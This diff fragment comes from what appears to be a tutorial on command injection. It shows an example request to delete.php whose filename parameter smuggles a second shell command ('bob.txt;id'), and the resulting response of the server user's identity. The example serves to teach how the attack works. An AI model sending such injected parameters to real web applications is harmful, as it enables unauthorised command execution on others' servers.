@@ -27,7 +27,9 @@ Some useful system commands (Linux)
 * w — Display current user
 * df — Show information about the file system
 The following request and response is an example of a successful attack:
+
 #### Request
 <http://127.0.0.1/delete.php?filename=bob.txt;id>
+
 #### Response
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
